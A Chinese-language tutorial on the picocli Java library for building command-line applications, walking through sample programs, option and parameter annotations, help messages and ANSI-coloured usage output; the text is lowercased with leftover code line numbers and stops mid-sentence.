commons cli等。在尝试使用commons cli时，我发现它确实好用，但是似乎满足不了彩色打印的需求。于是我开始寻找其他的解决方案，最终发现了picocli。\n\n快速入门文档地址：https://picocli.info/quick-guide.html\n\n完整文档地址：https://picocli.info\n\ngithub地址：https://github.com/remkop/picocli\n\n\n# 简介\n\n> picocli使用接近零代码的方式在一个文件中完成java cli程序的创建，picocli的目标是创建一个可以在jvm运行或者脱离jvm的请打命令行应用。\n\npicocli支持诸如：posix、gnu、ms-dos等多种命令行语法样式，并且可以ansi颜色和样式生成高度定制化的帮助信息。基于picocli创建的命令行程序支持任何层级下的命令参数提示和补全。基于picocli的应用程序可以提前编译为graalvm本机映像，启动时间极快，内存要求更低，可以作为单个可执行文件分发。picocli还可以为您的应用程序生成精美的文档，格式包括html、pdf和unix手册页。\n\n使用帮助的例子：\n\n\n\n> 本文使用picocli的注解api。对于无法使用注解的应用程序，还有一个编程api，用于定义预期的选项和位置参数，并处理解析结果。本快速指南不涵盖编程api。\n\n\n# 入门案例\n\n下面以一个小型但功能齐全的基于picocli的命令行应用程序asciiart作为示例代码。\n\nasciiart将一个或多个参数转换为ascii字符画，并将其打印出来。使用方法如下：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" asciiart --font-size=9 hello picocli\n       #   #       #  #                 #                  #  #\n       #   #       #  #                                    #\n       #   #  ***  #  #  ****     #***  #  **#  ****  **#  #  #\n       #####  ***  #  #  ****     #***  #  **   ****  **   #  #\n       #   #  *#*  #  #  *  *     #  *  #  *    *  *  *    #  #\n       #   #  **   #  #  ****     #***  #  **   ****  **   #  #\n       #   #  **#  #  #  ****     #***  #  **#  ****  **#  #  #\n                                  #\n                                  *\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果你想直接以以下的方式运行，可以查看应用打包的相关文档。\n\nasciiart --font-size=9 hello picocli\n\n\n1\n\n\n\n# asciiart 源码解读\n\nasciiart的代码缩短如下：\n\n/**\n * ascii art: basic picocli based sample application\n * explanation: <a href="https://picocli.info/quick-guide.html#_basic_example_asciiart">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/i18n/i18ndemo.java">github</a> \n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.option;\nimport picocli.commandline.parameters;\n\nimport java.awt.font;\nimport java.awt.graphics;\nimport java.awt.graphics2d;\nimport java.awt.renderinghints;\nimport java.awt.image.bufferedimage;\n\n@command(name = "asciiart", version = "asciiart 1.0", mixinstandardhelpoptions = true) // |1|\npublic class asciiart implements runnable { // |2|\n\n    @option(names = { "-s", "--font-size" }, description = "font size") // |3|\n    int fontsize = 14;\n\n    @parameters(paramlabel = "<word>", defaultvalue = "hello, picocli",  // |4|\n               description = "words to be translated into ascii art.")\n    private string[] words = { "hello,", "picocli" }; // |5|\n\n    @override\n    public void run() { // |6|\n        // https://stackoverflow.com/questions/7098972/ascii-art-java\n        bufferedimage image = new bufferedimage(144, 32, bufferedimage.type_int_rgb);\n        graphics graphics = image.getgraphics();\n        graphics.setfont(new font("dialog", font.plain, fontsize));\n        graphics2d graphics2d = (graphics2d) graphics;\n        graphics2d.setrenderinghint(renderinghints.key_text_antialiasing,\n                renderinghints.value_text_antialias_on);\n        graphics2d.drawstring(string.join(" ", words), 6, 24);\n\n        for (int y = 0; y < 32; y++) {\n            stringbuilder builder = new stringbuilder();\n            for (int x = 0; x < 144; x++)\n                builder.append(image.getrgb(x, y) == -16777216 ? " " : image.getrgb(x, y) == -1 ? "#" : "*");\n            if (builder.tostring().trim().isempty()) continue;\n            system.out.println(builder);\n        }\n    }\n\n    public static void main(string[] args) {\n        int exitcode = new commandline(new asciiart()).execute(args); // |7|\n        system.exit(exitcode); // |8|\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n我们可以把上面的代码拆分来看：\n\n 1. 创建一个类继承runable或者callable。\n 2. 使用@command注解标注这个类，并设置一个名字；mixinstandardhelpoptions选项用于生成一个帮助和版本文档（使用参数--help和--version）。\n 3. 给每一个命令选项对应的成员变量添加一个@option注解，如上所示，你可以定义一个选项的名称和注释。当然，还有一些其他的选项。\n 4. 给每一个可能的参数添加一个@parameters注解，picocli将把命令行参数转换为强类型值，并将这些值注入被注解的字段。\n 5. 在类的run或call方法中定义您的业务逻辑。解析成功完成后调用此方法。\n 6. 在类的main方法中，使用commandline.execute方法引导应用程序。这将解析命令行，处理错误，处理使用请求和版本帮助，并调用业务逻辑。\n 7. commandline.execute方法返回一个退出代码。您的应用程序可以使用此退出代码调用system.exit，以表示调用过程的成功或失败。\n\n这是几乎任何picocli应用的基本框架。\n\n> 有关更多使用帮助，请参阅参考手册，例如给方法添加一个注解。\n\n像任何专业的命令行应用程序一样，asciiart有--help和--version选项。--help选项向用户展示了如何使用应用程序。picocli会自动生成此使用帮助消息：\n\n$ asciiart --help\nusage: asciiart [-hv] [-s=<fontsize>] [<word>...]\n      [<word>...]             words to be translated into ascii art.\n  -s, --font-size=<fontsize>  font size\n  -h, --help                  show this help message and exit.\n  -v, --version               print version information and exit.\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 运行程序\n\n添加picocli依赖。\n\n<dependencies>\n  <dependency>\n    <groupid>info.picocli</groupid>\n    <artifactid>picocli</artifactid>\n    <version>4.6.3</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n设置运行参数为-h并运行。\n\n\n\n\n# 子命令案例\n\n下面我们展示了另一个小型但功能齐全的基于picocli的命令行应用程序示例，该应用程序解释了子命令的使用：isocoderesolver。\n\n该应用程序有两个子命令，语言和国家，根据iso标准解析语言或国家代码（国家代码为iso-3166-1，语言代码为iso-639-1/639-2）。该应用程序可以按以下方式使用：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" isocoderesolver language de cs en sd se\nde: german\ncs: czech\nen: english\nsd: sindhi\nse: northern sami\n\n\n1\n2\n3\n4\n5\n6\n\n\n或者：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" isocoderesolver country cn fr th ro no\ncn: china\nfr: france\nth: thailand\nro: romania\nno: norway\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 源码解读\n\n源代码如下所示：\n\n/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a> \n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { subcommandasclass.class, commandline.helpcommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver implements runnable { // |1|\n  @spec commandspec spec;\n\n  @command(name = "country", description = "resolve iso country code (iso-3166-1, alpha-2 code)") // |3|\n  void subcommandviamethod(@parameters(arity = "1..*", paramlabel = "<country code>",\n                                       description = "country code(s) to be resolved") string[] countrycodes) {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n\n  @override\n  public void run() {\n    throw new parameterexception(spec.commandline(), "specify a subcommand");\n  }\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n@command(name = "language", description = "resolve iso language code (iso 639-1 or -2, two/three letters)") // |4|\nclass subcommandasclass implements runnable {\n\n  @parameters(arity = "1..*", paramlabel = "<language code>", description = "language code(s) to be resolved")\n  private string[] languagecodes;\n\n  @override\n  public void run() {\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 1. 当顶级命令没有实现runnable或callable时，用户必须指定一个子命令（子命令成为必填项）。这是可选的：如果父命令可以在应用程序中无需子命令的情况下自行执行，只需实现runnable或callable即可。\n 2. 使用@command标注这个类，同时需要注意的是我们使用commandline.helpcommand.class作为子类，生成help子命令。\n 3. 可以通过两种方式将自定义子命令添加到顶级命令中。最简单的方法是向类中的方法添加@command注解。对于子命令的每个选项和位置参数，添加一个方法参数，并使用@option或@parameters注释对这些方法参数进行注释。在上面的示例中，一旦用户调用子命令contary，关联方法subcommandviamethod就会被调用。\n 4. 在较大的应用程序中，通常为每个子命令创建一个单独的@command注释的类。在上面的示例中，subcommandasclass类表示language子命令。一旦用户调用此子命令，将调用该类的重写的run方法。要注册子命令，请在父命令的@command注释的子命令属性中指定子命令类（subcommands = { subcommandasclass.class, ... }）。\n 5. 在类的main方法中，使用commandline.execute方法引导应用程序。这将解析命令行，处理错误，处理使用请求和版本帮助，并调用业务逻辑。\n 6. commandline.execute方法返回一个退出代码。您的应用程序可以使用此退出代码调用system.exit，以表示调用过程的成功或失败。\n\n> 有关子命令的更多详细信息和方面，请参阅参考手册的子命令一章。\n\n除了两个用户定义的子命令外，isocoderesolver应用程序还提供了一个帮助子命令，该子命令将使用帮助消息打印到控制台。picocli会自动生成此使用帮助消息：\n\n$ isocoderesolver help\nusage: isocoderesolver [command]\nresolves iso country codes (iso-3166-1) or language codes (iso-639-1/-2)\ncommands:\n  help      displays help information about the specified command\n  country   resolves iso country codes (iso-3166-1)\n  language  resolves one or more iso language codes (iso-639-1 or 639-2)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 执行和改写以上的代码\n\n完全使用方法实现，改写如下：\n\npackage com.pwddd.picocli;/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a>\n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { commandline.helpcommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver  { // |1|\n  @spec commandspec spec;\n\n  @command(name = "country", description = "resolve iso country code (iso-3166-1, alpha-2 code)") // |3|\n  void subcommandviamethod(@parameters(arity = "1..*", paramlabel = "<country code>",\n                                       description = "country code(s) to be resolved") string[] countrycodes) {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n\n  @command(name = "language",description = "resolve iso language code (iso 639-1 or -2, two/three letters)")\n  void subcommandviamethodlanguage(@parameters(arity = "1..*",\n          paramlabel = "<language code>",\n          description = "language code(s) to be resolved") string[] languagecodes){\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n完全使用类实现，改写如下：\n\npackage com.pwddd.picocli;/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a>\n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { commandline.helpcommand.class,languagecommand.class,countrycommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver  { // |1|\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n@command(name = "language",description = "resolve iso language code (iso 639-1 or -2, two/three letters)")\nclass languagecommand implements runnable{\n\n  @parameters(arity = "1..*", paramlabel = "<language code>", description = "language code(s) to be resolved")\n  private string[] languagecodes;\n\n  @override\n  public void run() {\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n}\n\n@command(name = "country",description = "resolve iso country code (iso-3166-1, alpha-2 code)")\nclass countrycommand implements runnable{\n\n  @parameters(arity = "1..*", paramlabel = "<country code>", description = "country code(s) to be resolved")\n  private string[] countrycodes;\n\n  @override\n  public void run() {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# 选项和参数\n\n命令行参数可以分为选项和位置参数。选项有一个名称，位置参数通常是选项后面的值，但它们可能是混合的。\n\n\n\npicocli对选项和位置参数有单独的注解。\n\n\n# 选项注解\n\n# 普通选项\n\n选项必须有一个或多个名称。选项名称通常以-或--开头，但picocli允许您使用您想要的任何选项名称。\n\n下面的示例显示了具有一个或多个名称的选项、使用选项参数的选项和帮助选项。\n\nclass tar {\n  @option(names = "-c", description = "create a new archive")\n  boolean create;\n\n  @option(names = { "-f", "--file" }, paramlabel = "archive", description = "the archive file")\n  file archive;\n\n  @parameters(paramlabel = "file", description = "one or more files to archive")\n  file[] files;\n\n  @option(names = { "-h", "--help" }, usagehelp = true, description = "display a help message")\n  private boolean helprequested;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\npicocli匹配选项名称来设置字段值。\n\npicocli支持posix集群短选项：一个或多个没有选项参数的单个字符选项，其次是最多一个带有选项参数的选项，可以分组在一个“-”破折号后面。\n\nstring[] args = { "-c", "--file", "result.tar", "file1.txt", "file2.txt" };\ntar tar = new tar();\nnew commandline(tar).parseargs(args);\n\nassert !tar.helprequested;\nassert  tar.create;\nassert  tar.archive.equals(new file("result.tar"));\nassert  arrays.equals(tar.files, new file[] {new file("file1.txt"), new file("file2.txt")});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n例如，对于上面的tar示例，以下命令行调用是等价的：\n\ntar -c -f result.tar f1.txt f2.txt\ntar -cf result.tar f1.txt f2.txt\ntar -cfresult.tar f1.txt f2.txt\n\n\n1\n2\n3\n\n\n# 交互式密码选项\n\n对于标记为交互式的选项和位置参数，系统会提示用户在控制台上输入值。在java 6或更高版本上运行时，picocli将使用console.readpassword api，以便用户输入不会响应到控制台。\n\n\n# 参数注解\n\n任何不是子命令、选项或选项参数的命令行参数都会被解释为位置参数。使用（基于零的）索引属性来准确指定要捕获的参数。省略索引属性意味着字段捕获所有位置参数。数组或集合字段可以捕获多个值。索引属性接受范围值，因此像@parameters（index = "2.4")这样的注释捕获索引2、3和4的参数。范围值可以是开放式的。例如，@parameters（index = "3..*")捕获索引3及以上的所有参数。\n\nclass positionaldemo {\n    @parameters(index = "0")    inetaddress host;\n    @parameters(index = "1")    int port;\n    @parameters(index = "2..*") list<file> files;\n}\n\n\n1\n2\n3\n4\n5\n\n\npicocli使用参数数组中指定索引处的值初始化字段。\n\nstring[] args = { "localhost", "12345", "file1.txt", "file2.txt" };\npositionaldemo params = commandline.populatecommand(new positionaldemo(), args);\n\nassert params.host.gethostname().equals("localhost");\nassert params.port == 12345;\nassert params.files.equals(arrays.aslist(new file("file1.txt"), new file("file2.txt")));\n\n\n1\n2\n3\n4\n5\n6\n\n\n用户手册有更多关于选项和位置参数的详细信息，以及--选项结束分隔符和参数文件（@-files）。\n\n\n# 强类型转换\n\n当命令行选项和位置参数映射到注解的字段时，文本值将转换为注解的字段的类型。\n\n\n# 类型转换\n\n开箱即用，picocli可以将命令行参数字符串转换为许多常见数据类型。有关内置类型的完整列表，请参阅用户手册，但一般来说，所有原始类型及其对象等价物，任何枚举以及文件、日期、url、bigdecimal、正则表达式模式等常见类都可以按原样使用。在java 7上运行的应用程序可以使用path，在java 8上可以使用新的java.time类。\n\n您还可以使用自定义类型转换器来处理上述内置数据类型以外的数据类型。\n\n\n# 集合和字典\n\n如果选项或位置参数可以具有多个值，则字段类型必须是数组、集合或映射。可以使用list、set或queue等任何集合子类。\n\n一个常见的要求是具有类似于java系统属性的键值对的选项，例如-dkey=value。要实现这一点，您只需使用map字段即可。\n\n只要为键和值类型都注册了类型转换器，映射字段的键和值可能具有任何类型。键和值类型从map的通用类型参数中推断出来。例如：\n\nclass mapdemo {\n    @option(names = {"-u", "--timeunit"});\n    map<java.util.concurrent.timeunit, long> timeout;\n}\n\n\n1\n2\n3\n4\n\n\n以下命令行将生成map中的四个键值条目：\n\n<command> -udays=3 -u hours=23 -u=minutes=59 --timeunit=seconds=13\n\n\n1\n\n\n\n# 必选参数\n\n\n# 必选选项\n\n可以标记所需的选项，使用户必须在命令行上指定它们。当未指定所需的选项时，将从解析方法中抛出missingparameterexception。例如：\n\n@option(names = "-n", required = true, description = "mandatory number")\nint number;\n\n\n1\n2\n\n\n\n# 必选参数\n\n使用arity让@parameter参数强制使用：\n\n@parameters(arity = "1..*", descriptions = "at least one file")\nlist<file> files;\n\n\n1\n2\n\n\n\n# 多值\n\n\n# 重复选项\n\n创建多值选项的最简单方法是声明一个带注释的字段，其类型是数组、集合或映射。\n\n@option(names = "-option")\nint[] values;\n\n\n1\n2\n\n\n使用如下的命令：\n\n<command> -option 111 -option 222 -option 333\n\n\n1\n\n\n每一个元素都会被添加到数组中。\n\n\n# 正则拆分\n\n选项和参数还可以指定一个拆分正则表达式，用于将每个选项参数拆分为较小的子字符串。每个子字符串都转换为集合或数组的类型。请参阅集合和字典\n\n@option(names = "-option", split = ",")\nint[] values;\n\n\n1\n2\n\n\n可以使用如下方式传递参数：\n\n-option 111,222,333\n\n\n1\n\n\n\n# arity\n\n有时，您想定义一个选项，该选项需要为命令行上的每个选项出现多个选项参数。arity属性允许您准确控制每次选项发生要消耗多少参数。\n\narity属性可以指定所需参数的确切数量，或具有最小和最大参数数量的范围。最大值可以是精确的上限，也可以是“*”来表示任意数量的参数。例如：\n\nclass aritydemo {\n    @parameters(arity = "1..3", descriptions = "one to three files")\n    file[] files;\n\n    @option(names = "-f", arity = "2", description = "exactly two floating point numbers")\n    double[] doubles;\n\n    @option(names = "-s", arity = "1..*", description = "at least one string")\n    string[] strings;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n当命令行上指定的参数少于最小值时，会抛出missingparameterexception。\n\n如果没有指定arity，参数的数量取决于字段的类型。用户手册有更多关于arity的详细信息。\n\n\n# help选项\n\n当mixinstandardhelpoptions命令属性设置为true时，picocli会在命令中添加mixin，该命令将 usagehelp和versionhelp选项添加到命令中。例如：\n\n@command(mixinstandardhelpoptions = true, version = "auto help demo - picocli 3.0")\nclass autohelpdemo implements runnable {\n\n    @option(names = "--option", description = "some option.")\n    string option;\n\n    @override public void run() { ... }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n上述示例的使用帮助消息如下所示：\n\nusage: <main class> [-hv] [--option=<option>]\n      --option=<option>   some option.\n  -h, --help              show this help message and exit.\n  -v, --version           print version information and exit\n\n\n1\n2\n3\n4\n\n\n\n# 自定义help选项\n\n应用程序可以通过设置属性versionhelp = true、 usagehelp = true或help = true来定义自定义帮助选项。如果命令行上指定的参数之一是“帮助”选项，当缺少所必须的选项时，picocli不会抛出missingparameterexception。\n\n@option(names = {"-v", "--version"}, versionhelp = true, description = "display version info")\nboolean versioninforequested;\n\n@option(names = {"?", "-h", "--help"}, usagehelp = true, description = "display this help message")\nboolean usagehelprequested;\n\n\n1\n2\n3\n4\n5\n\n\n将这些属性用于请求在控制台上显示使用帮助消息或版本信息的选项。\n\ncommandline类提供了两种方法，允许外部组件检测是否请求了使用帮助或版本信息（无需检查带注释的域对象）：\n\n * commandline.isusagehelprequested()如果解析器匹配了用使用help=true注释的选项，则返回true\n * 如果解析器匹配带有versionhelp=true注释的选项，commandline.isversionhelprequested()返回true\n\ncommandline commandline = new commandline(new app());\ncommandline.parseargs(args);\nif (commandline.isusagehelprequested()) {\n   commandline.usage(system.out);\n   return;\n} else if (commandline.isversionhelprequested()) {\n   commandline.printversionhelp(system.out);\n   return;\n}\n// ... run app\'s business logic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n另请参阅用户手册的“自动打印帮助”一章。\n\n\n# version help\n\n\n# 静态版本信息\n\n应用程序可以在@command注释的版本属性中指定版本信息。\n\n@command(version = "1.0")\nclass versionedcommand { ... }\n\n\n1\n2\n\n\ncommandline.printversionhelp（printstream）方法从此注释中提取版本信息，并将其打印到指定的printstream。\n\ncommandline commandline = new commandline(new versionedcommand());\n//...\ncommandline.printversionhelp(system.out);\n\n\n1\n2\n3\n\n\n该版本可以指定多个字符串，并可能包含标记以显示ansi样式和颜色。例如：\n\n@command(version = {\n        "@|yellow versioned command 1.0|@",\n        "@|blue build 12345|@",\n        "@|red,bg(white) (c) 2017|@" })\nclass versionedcommand { ... }\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# 动态版本信息\n\n@command注释支持versionprovider属性。应用程序可以在此属性中指定iversionprovider实现，picocli将实例化该类并调用它来收集版本信息。\n\ngithub项目有一个示例实现，可以从清单文件中获取版本，另一个示例从构建生成的版本属性文件中获取版本信息。\n\n\n# usage help\n\n\n# 使用信息示例\n\npicocli使您的应用程序可以轻松生成这样的使用帮助消息：\n\nusage: cat [-abeensttuv] [--help] [--version] [file...]\nconcatenate file(s), or standard input, to standard output.\n      file                 files whose contents to display\n  -a, --show-all           equivalent to -vet\n  -b, --number-nonblank    number nonempty output lines, overrides -n\n  -e                       equivalent to -vet\n  -e, --show-ends          display $ at end of each line\n  -n, --number             number all output lines\n  -s, --squeeze-blank      suppress repeated empty output lines\n  -t                       equivalent to -vt\n  -t, --show-tabs          display tab characters as ^i\n  -u                       (ignored)\n  -v, --show-nonprinting   use ^ and m- notation, except for ldf and tab\n      --help               display this help and exit\n      --version            output version information and exit\ncopyright(c) 2019\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n使用帮助消息由注解属性生成，如下所示：\n\n@command(name = "cat", footer = "copyright(c) 2019",\n         description = "concatenate file(s), or standard input, to standard output.")\nclass cat {\n\n  @parameters(paramlabel = "file", description = "files whose contents to display")\n  list<file> files;\n\n  @option(names = "--help", usagehelp = true, description = "display this help and exit")\n  boolean help;\n\n  @option(names = "-t",                 description = "equivalent to -vt")  boolean t;\n  @option(names = "-e",                 description = "equivalent to -vet") boolean e;\n  @option(names = {"-a", "--show-all"}, description = "equivalent to -vet") boolean all;\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 使用帮助消息元素\n\n使用帮助消息的各种元素很容易用注解自定义。\n\n# 命令名称\n\n在上面的示例中，程序名称取自命令注释的名称属性：\n\n@command(name = "cat")\n\n\n1\n\n\n没有名称属性，picocli将在概要中显示一个通用的<main class>：\n\nusage: <main class> [-abeensttuv] [--help] [--version] [file...]\n\n\n1\n\n\n# 参数标签\n\n非布尔选项需要一个值。使用帮助应该解释这一点，picocli在概要和选项列表中显示选项参数。默认情况下，字段名显示在<和>括号中。使用paramlabel属性显示不同的名称。例如：\n\nusage: <main class> [-f=file] [-n=<number>] num <host>\n      num        number param\n      host       the host\n  -f= file       a file\n  -n= <number>   number option\n\n\n1\n2\n3\n4\n5\n\n\n以下示例类中的一些注释字段具有paramlabel属性，而另一些则没有：\n\n@command()\nclass paramlabels {\n    @option(names = "-f",    description = "a file",       paramlabel = "file") file f;\n    @option(names = "-n",    description = "number option")                     int number;\n    @parameters(index = "0", description = "number param", paramlabel = "num")  int n;\n    @parameters(index = "1", description = "the host")                          inetaddress host;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 排序的选项列表\n\n默认情况下，选项列表按字母顺序显示选项。使用sortoptions = false属性按照您类中声明的顺序显示选项。\n\n@command(sortoptions = false)\n\n\n1\n\n\n# 缩写简述\n\n如果命令非常复杂并且有很多选项，有时最好使用缩写synopsis属性抑制概要中的细节。例如：\n\n@command(abbreviatesynopsis = true)\nclass app { ... }\n\n\n1\n2\n\n\n这显示了下面的概要。位置参数不缩写。\n\nusage: <main class> [options] [<files>...\n\n\n1\n\n\n# 自定义概要\n\n为了更好地控制概要，请使用customsynopsis属性指定一个或多个概要行。例如：\n\nusage: ln [option]... [-t] target link_name   (1st form)\n  or:  ln [option]... target                  (2nd form)\n  or:  ln [option]... target... directory     (3rd form)\n  or:  ln [option]... -t directory target...  (4th form)\n\n\n1\n2\n3\n4\n\n\n要生成上述概要，请在customsynopsis属性中指定文字文本：\n\n@command(synopsisheading = "", customsynopsis = {\n        "usage: ln [option]... [-t] target link_name   (1st form)",\n        "  or:  ln [option]... target                  (2nd form)",\n        "  or:  ln [option]... target... directory     (3rd form)",\n        "  or:  ln [option]... -t directory target...  (4th form)",\n})\nclass ln { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 头部和底部\n\n标题将显示在使用帮助消息的顶部（大纲之前）。如果您的命令有子命令，第一个标题行也是子命令列表中显示的行（请参阅子命令的使用帮助）。\n\n使用页脚属性指定一行或多行，以显示在生成的使用帮助消息下方。属性字符串数组的每个元素都显示在单独的行上。\n\nheaderheading和footerheading可能包含格式说明符。请参阅部分标题。\n\n# 章节标题\n\n部分标题可用于使使用消息布局看起来更宽敞。章节标题可能包含嵌入式行分隔符（%n）格式说明符：\n\n@command(name = "commit",\n        sortoptions = false,\n        headerheading = "usage:%n%n",\n        synopsisheading = "%n",\n        descriptionheading = "%ndescription:%n%n",\n        parameterlistheading = "%nparameters:%n",\n        optionlistheading = "%noptions:%n",\n        header = "record changes to the repository.",\n        description = "stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass gitcommit { ... }\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从该类生成的帮助消息的使用情况如下所示在用户手册的扩展示例中。\n\n# 选项参数分离器\n\n概要中显示的选项和选项参数（默认为=）之间的分隔符和选项列表可以使用分隔符属性进行配置。\n\n@command(separator = ":")\t\n\n\n1\n\n\n# 隐藏选项和参数\n\n将隐藏属性设置为true的选项和参数将不会显示在使用帮助消息中。有关详细信息，请参阅用户手册。\n\n# 显示默认值\n\n选项或位置参数的默认值可以通过在描述文本中指定变量${default-value}嵌入到描述中。有关详细信息，请参阅用户手册。\n\n同样，可以通过在描述文本中指定变量${completion-candidates}，将完成候选者嵌入到选项或位置参数的描述中。有关详细信息，请参阅用户手册。\n\n# 必填选项标记\n\n所需选项可以通过使用 requiredoptionmarker 属性指定的字符在选项列表中标记。有关详细信息，请参阅用户手册\n\n# 显示宽度\n\n使用帮助消息的默认宽度为80个字符。系统属性picocli.usage.width可用于指定自定义宽度。可以配置的最小宽度为55个字符。\n\n宽度也可以通过commandline::setusagehelpwidth和usagemessagespec::width方法以编程方式设置。\n\n\n# ansi颜色和风格\n\n\n# 彩色示例\n\n下面显示了与用户手册中扩展示例中显示的相同的使用帮助消息，并启用了ansi转义代码。\n\n\n\n\n# 样式和颜色的使用帮助\n\n您可以在使用帮助消息的描述、页眉和页脚中使用颜色和样式。\n\npicocli支持自定义标记符号，用于在文本中混合颜色和样式，遵循jansi引入的约定，其中@|开始一个样式部分，|@结束它。紧接着@|是一个逗号分隔的颜色和样式列表，所以@|style1[,style2]...文本|@。例如：\n\n@command(description = "custom @|bold,underline styles|@ and @|fg(red) colors|@.")\n\n\n1\n\n\n\n\n预定义的样式和颜色表\n\npre-defined styles   pre-defined colors\nbold                 black\nfaint                red\nunderline            green\nitalic               yellow\nblink                blue\nreverse              magenta\nreset                cyan\n                     white\n\n默认情况下，颜色作为前景颜色应用。您可以通过指定bg（<color>）来设置背景颜色。例如，红色背景的@|bg（红色）文本|@。同样，fg（<color>）显式设置前景颜色。\n\n下面的示例展示了如何使用此标记为使用帮助消息的标题和描述添加颜色和样式：\n\n@command(name 